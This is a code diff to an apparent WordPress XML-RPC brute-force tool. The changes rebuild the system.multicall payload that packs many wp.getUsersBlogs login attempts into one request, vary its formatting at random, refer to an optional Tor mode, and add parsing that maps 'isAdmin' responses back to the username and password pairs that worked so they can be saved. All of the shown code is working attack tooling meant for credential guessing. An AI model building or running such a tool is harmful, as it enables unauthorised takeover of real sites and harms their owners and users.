@@ -1,3 +1,4 @@
+import xml.etree.ElementTree as ET
 import asyncio
 import aiohttp
 import time
@@ -260,17 +261,41 @@ async def exploit_multicall(url, usernames, passwords, session):
             # Payload variation
             if random.choice([True, False]):
                 method_calls += f"""
-                  <methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>
+                <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{username}</string></value><value><string>{password}</string></value></data></array></value></data></array></value></member></struct></value>
                  """
             else:
                 method_calls += f"""
-                <methodCall>
-                   <methodName>wp.getUsersBlogs</methodName>
-                    <params>
-                        <param><value><string>{username}</string></value></param>
-                        <param><value><string>{password}</string></value></param>
-                    </params>
-                </methodCall>
+                <value>
+                    <struct>
+                        <member>
+                            <name>methodName</name>
+                            <value>
+                                <string>wp.getUsersBlogs</string>
+                            </value>
+                        </member>
+                        <member>
+                            <name>params</name>
+                            <value>
+                                <array>
+                                    <data>
+                                        <value>
+                                            <array>
+                                                <data>
+                                                    <value>
+                                                        <string>{username}</string>
+                                                    </value>
+                                                    <value>
+                                                        <string>{password}</string>
+                                                    </value>
+                                                </data>
+                                            </array>
+                                        </value>
+                                    </data>
+                                </array>
+                            </value>
+                        </member>
+                    </struct>
+                </value>
                 """
 
     data = f"""
@@ -457,6 +482,9 @@ async def start_multicall_async(url, usernames, passwords, session, use_tor=Fals
         )  # Print only the first 200 chars for readability
 
         # Analyze the response, look for any successes
+        # Not sure where the Dashboard comes from, in our testing 'isAdmin' was
+        # the good match. But I figure this might go with older versions, so
+        # until I can determine otherwise, I will leave it
         if "Dashboard" in response_text:
             for username in usernames:
                 for password in passwords:
@@ -468,6 +496,40 @@ async def start_multicall_async(url, usernames, passwords, session, use_tor=Fals
                             f"\n{Fore.GREEN}Multicall login successful with {username}:{password}"
                         )
                         await save_successful_login(username, password)
+        else:
+            print(f"{Fore.RED} 'Dashboard' not in response_text.")
+
+        if 'isAdmin' in response_text:
+            print(
+                f"\n{Fore.GREEN}Multicall response has at least one successful login...parsing"
+                )
+            # Convert response_text to XML for XPathing
+            xmlroot = ET.fromstring(response_text.strip())
+            xml_names = xmlroot.findall('.//value/struct/member/name')
+
+            # Build a list of all user/pass combos in the same order as the
+            # request was created, so we can match working combos by index later
+            all_user_pass_combos = [[u, p] for u in usernames for p in passwords]
+
+            # Working and not working responses have different XML structures,
+            # which results in our xpath returning more than one per attempt.
+            # This narrows down xml_names to one per attempt (compare_matches).
+            # isAdmin == working, faultCode == not working
+            targetted_names = ['isAdmin', 'faultCode']
+            compare_matches = [e.text for e in xml_names if e.text in targetted_names]
+
+            # If one of the matches is 'isAdmin', save off its index
+            matching_indices = [i for i, v in enumerate(compare_matches) if v == 'isAdmin']
+
+            # Save the user_pass combos which correspond to a good index, then
+            # save to successful logins file
+            good_user_pass_combos = list(map(all_user_pass_combos.__getitem__, matching_indices))
+            for user_pass_combo in good_user_pass_combos:
+                print(f"{Fore.GREEN}MATCH: {user_pass_combo[0]}:{user_pass_combo[1]}")
+                await save_successful_login(user_pass_combo[0], user_pass_combo[1])
+
+        else:
+            print(f"{Fore.RED} 'isAdmin' not in response_text No matches.")
 
         return response_time
     return None
